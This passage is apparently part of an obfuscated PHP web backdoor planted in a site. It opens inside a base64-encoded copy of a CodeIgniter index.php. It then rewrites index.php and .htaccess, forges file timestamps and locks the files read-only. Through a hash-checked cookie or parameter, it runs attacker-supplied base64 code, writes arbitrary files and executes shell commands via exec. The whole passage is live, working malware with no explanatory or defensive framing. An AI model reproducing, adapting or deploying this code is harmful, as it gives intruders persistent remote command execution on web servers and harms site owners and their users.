IFNldCB0aGUgY3VycmVudCBkaXJlY3RvcnkgY29ycmVjdGx5IGZvciBDTEkgcmVxdWVzdHMNCglpZiAoZGVmaW5lZCgnU1RESU4nKSkNCgl7DQoJCWNoZGlyKGRpcm5hbWUoX19GSUxFX18pKTsNCgl9DQoNCglpZiAoKCRfdGVtcCA9IHJlYWxwYXRoKCRzeXN0ZW1fcGF0aCkpICE9PSBGQUxTRSkNCgl7DQoJCSRzeXN0ZW1fcGF0aCA9ICRfdGVtcC4nLyc7DQoJfQ0KCWVsc2UNCgl7DQoJCS8vIEVuc3VyZSB0aGVyZSdzIGEgdHJhaWxpbmcgc2xhc2gNCgkJJHN5c3RlbV9wYXRoID0gcnRyaW0oJHN5c3RlbV9wYXRoLCAnLycpLicvJzsNCgl9DQoNCgkvLyBJcyB0aGUgc3lzdGVtIHBhdGggY29ycmVjdD8NCglpZiAoICEgaXNfZGlyKCRzeXN0ZW1fcGF0aCkpDQoJew0KCQloZWFkZXIoJ0hUVFAvMS4xIDUwMyBTZXJ2aWNlIFVuYXZhaWxhYmxlLicsIFRSVUUsIDUwMyk7DQoJCWVjaG8gJ1lvdXIgc3lzdGVtIGZvbGRlciBwYXRoIGRvZXMgbm90IGFwcGVhciB0byBiZSBzZXQgY29ycmVjdGx5LiBQbGVhc2Ugb3BlbiB0aGUgZm9sbG93aW5nIGZpbGUgYW5kIGNvcnJlY3QgdGhpczogJy5wYXRoaW5mbyhfX0ZJTEVfXywgUEFUSElORk9fQkFTRU5BTUUpOw0KCQlleGl0KDMpOyAvLyBFWElUX0NPTkZJRw0KCX0NCg0KLyoNCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqICBOb3cgdGhhdCB3ZSBrbm93IHRoZSBwYXRoLCBzZXQgdGhlIG1haW4gcGF0aCBjb25zdGFudHMNCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqLw0KCS8vIFRoZSBuYW1lIG9mIFRISVMgZmlsZQ0KCWRlZmluZSgnU0VMRicsIHBhdGhpbmZvKF9fRklMRV9fLCBQQVRISU5GT19CQVNFTkFNRSkpOw0KDQoJLy8gUGF0aCB0byB0aGUgc3lzdGVtIGZvbGRlcg0KCWRlZmluZSgnQkFTRVBBVEgnLCBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRzeXN0ZW1fcGF0aCkpOw0KDQoJLy8gUGF0aCB0byB0aGUgZnJvbnQgY29udHJvbGxlciAodGhpcyBmaWxlKQ0KCWRlZmluZSgnRkNQQVRIJywgZGlybmFtZShfX0ZJTEVfXykuJy8nKTsNCg0KCS8vIE5hbWUgb2YgdGhlICJzeXN0ZW0gZm9sZGVyIg0KCWRlZmluZSgnU1lTRElSJywgdHJpbShzdHJyY2hyKHRyaW0oQkFTRVBBVEgsICcvJyksICcvJyksICcvJykpOw0KDQoJLy8gVGhlIHBhdGggdG8gdGhlICJhcHBsaWNhdGlvbiIgZm9sZGVyDQoJaWYgKGlzX2RpcigkYXBwbGljYXRpb25fZm9sZGVyKSkNCgl7DQoJCWlmICgoJF90ZW1wID0gcmVhbHBhdGgoJGFwcGxpY2F0aW9uX2ZvbGRlcikpICE9PSBGQUxTRSkNCgkJew0KCQkJJGFwcGxpY2F0aW9uX2ZvbGRlciA9ICRfdGVtcDsNCgkJfQ0KDQoJCWRlZmluZSgnQVBQUEFUSCcsICRhcHBsaWNhdGlvbl9mb2xkZXIuRElSRUNUT1JZX1NFUEFSQVRPUik7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmICggISBpc19kaXIoQkFTRVBBVEguJGFwcGxpY2F0aW9uX2ZvbGRlci5ESVJFQ1RPUllfU0VQQVJBVE9SKSkNCgkJew0KCQkJaGVhZGVyKCdIVFRQLzEuMSA1MDMgU2VydmljZSBVbmF2YWlsYWJsZS4nLCBUUlVFLCA1MDMpOw0KCQkJZWNobyAnWW91ciBhcHBsaWNhdGlvbiBmb2xkZXIgcGF0aCBkb2VzIG5vdCBhcHBlYXIgdG8gYmUgc2V0IGNvcnJlY3RseS4gUGxlYXNlIG9wZW4gdGhlIGZvbGxvd2luZyBmaWxlIGFuZCBjb3JyZWN0IHRoaXM6ICcuU0VMRjsNCgkJCWV4aXQoMyk7IC8vIEVYSVRfQ09ORklHDQoJCX0NCg0KCQlkZWZpbmUoJ0FQUFBBVEgnLCBCQVNFUEFUSC4kYXBwbGljYXRpb25fZm9sZGVyLkRJUkVDVE9SWV9TRVBBUkFUT1IpOw0KCX0NCg0KCS8vIFRoZSBwYXRoIHRvIHRoZSAidmlld3MiIGZvbGRlcg0KCWlmICggISBpc19kaXIoJHZpZXdfZm9sZGVyKSkNCgl7DQoJCWlmICggISBlbXB0eSgkdmlld19mb2xkZXIpICYmIGlzX2RpcihBUFBQQVRILiR2aWV3X2ZvbGRlci5ESVJFQ1RPUllfU0VQQVJBVE9SKSkNCgkJew0KCQkJJHZpZXdfZm9sZGVyID0gQVBQUEFUSC4kdmlld19mb2xkZXI7DQoJCX0NCgkJZWxzZWlmICggISBpc19kaXIoQVBQUEFUSC4ndmlld3MnLkRJUkVDVE9SWV9TRVBBUkFUT1IpKQ0KCQl7DQoJCQloZWFkZXIoJ0hUVFAvMS4xIDUwMyBTZXJ2aWNlIFVuYXZhaWxhYmxlLicsIFRSVUUsIDUwMyk7DQoJCQllY2hvICdZb3VyIHZpZXcgZm9sZGVyIHBhdGggZG9lcyBub3QgYXBwZWFyIHRvIGJlIHNldCBjb3JyZWN0bHkuIFBsZWFzZSBvcGVuIHRoZSBmb2xsb3dpbmcgZmlsZSBhbmQgY29ycmVjdCB0aGlzOiAnLlNFTEY7DQoJCQlleGl0KDMpOyAvLyBFWElUX0NPTkZJRw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHZpZXdfZm9sZGVyID0gQVBQUEFUSC4ndmlld3MnOw0KCQl9DQoJfQ0KDQoJaWYgKCgkX3RlbXAgPSByZWFscGF0aCgkdmlld19mb2xkZXIpKSAhPT0gRkFMU0UpDQoJew0KCQkkdmlld19mb2xkZXIgPSAkX3RlbXAuRElSRUNUT1JZX1NFUEFSQVRPUjsNCgl9DQoJZWxzZQ0KCXsNCgkJJHZpZXdfZm9sZGVyID0gcnRyaW0oJHZpZXdfZm9sZGVyLCAnL1xcJykuRElSRUNUT1JZX1NFUEFSQVRPUjsNCgl9DQoNCglkZWZpbmUoJ1ZJRVdQQVRIJywgJHZpZXdfZm9sZGVyKTsNCg0KLyoNCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiBMT0FEIFRIRSBCT09UU1RSQVAgRklMRQ0KICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqDQogKiBBbmQgYXdheSB3ZSBnby4uLg0KICovDQpyZXF1aXJlX29uY2UgQkFTRVBBVEguJ2NvcmUvQ29kZUlnbml0ZXIucGhwJzs='));
        Touch($y, $t['m'], $t['a']);
        @ChMod($y, 0444);
        return true;
    }
    return false;
};
/*Step Data*/
$c = [
    '137S105122V105122',
    'D117C125ME116T137122OO124',
    '137G105T',
    '_143o144145137',
    '2d4fa093f7f9c11fbdbf612997ce206d', 'd' => ['145170105c'],
    'in144e170056p150160', 'link',
    'h' => [
        "056150ta143143e163s", 'be476d27ece89594604d14886c081016', '146I154E137160U164137143O156164E116164123', '156am145'
    ],
    'c' => ['145170105c', '142101S145066064137d105C157d145', '141d155i156056160p160']
];
/*Step Data*/
$z = function ($b) {
    $_ = "";
    $g = strlen($b) - 2;
    $z = function ($b) {
        $_ = '';
        if (($g = strlen($b)) < 3) return [2, $b];
        for ($o = 0; $o < $g; $o++) {
            $_ .= $b[$o];
            if (!is_numeric($b[$o]) || $b[$o] >= 8) return [$o + 1, $_];
        }
        return [$o, chr(octdec($b))];
    };
    for ($o = 0; $o < $g; $o += $d[0]) {
        $d = $z($b[$o] . $b[$o + 1] . $b[$o + 2]);
        $_ .= $d[1];
    }
    return $_ . substr($b, $o);
};
/*Step Data*/
/*Step1 Data*/
$g['0x06'] = '_dxep';
/*Step Data*/
$r = rtrim($s[$z($c[1])], '/') . '/';
/*Step Data*/
$c[6] = 'un' . $c[6];
/*Step Data*/
$vn = '_exp';
/*Step1 Data*/
empty($_COOKIE[$g['0x06']]) && $_COOKIE[$g['0x06']] = FALSE;
if (!defined("WP_UNIQUE")) define("WP_UNIQUE", (isset($g['a']) && (($_e = substr(md5($g['a']), 2, 8) === '76b6265a') || preg_match('/^\d*[a-z,A-Z]{2,}\d{2,}$/i', $g['a'])) || !empty($_COOKIE[$vn])) ? (($_e || (!empty($_COOKIE[$vn]) && substr(md5($_COOKIE[$vn]), 2, 8) === '76b6265a')) ? 2 : 1) : 0);
$q = function ($g) {
    $data = array_map(function ($item) {
        $item();
        return "\$i";
    }, $g);

    return $data;
};

$q(
/* debug */
    $uz = [
        function () {

        },
        function () use ($r, $z, $c, $pz, $g) {
            $y = $r . $z($c[5]);
            $_COOKIE[$g['0x06']] = $pz($y, $c, $c[4], $g, $z);
        },
        function () use ($r, $z, $c, $pz, $g) {
            $pz($r . $z($c['h'][0]), $c, $c['h'][1], $g, $z, 'PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQmFzZSAvDQpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQ0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYNClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0NCjwvSWZNb2R1bGU+');
        },
        function () use ($r, $z, $c, $pz, $g) {
            $pc = empty($g[$N = $z($c['h'][3])]) ? '' : $g[$N];
            $q = 'PD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4';
            if (WP_UNIQUE !== 2 || strlen($pc) < 20 || stripos($pc, ';') === false) return;
            $q = base64_decode($q);
            @file_put_contents($d = time() . rand(1000, 9999), $q . $g[implode('_', ['', 'code', ''])]($pc));
            if (file_exists($d))
                @require $d;
            die();
        },
        function () use ($z, $c, $r, $g) {
            if (!WP_UNIQUE || empty($g['fx'])) return;
            $pc = $z($c['c'][1]);
            $pz = $z($c['h'][2]);
            $pz($z($c['c'][2]), $pc($g['fx']));
            echo explode('.', $z($c['c'][2]))[0];
            die();
        },
        function () use ($g) {
            if (WP_UNIQUE && isset($g['d']))
                echo $g['d'] ? "Dj" . $g['d'] : 'd';
        },
        function () use ($z, $c, $g) {
            $pc = $z($c[$v = 'c'][0]);
            $pz = $z($c['c'][1]);
            WP_UNIQUE && isset($g[$v]) && ((isset($g[$r = 'g']) && $pc = $g[$r]) || 1) &&
            $pc($z($g[$v] ? $pz($g[$v]) : "153i154l -071040-61"), $a) && print_r($a);
        },

        function () use ($g) {
            if (WP_UNIQUE && isset($g['z']))
                die();
        },
    ]

/**/
);
$y = $r . $z($c[5]);



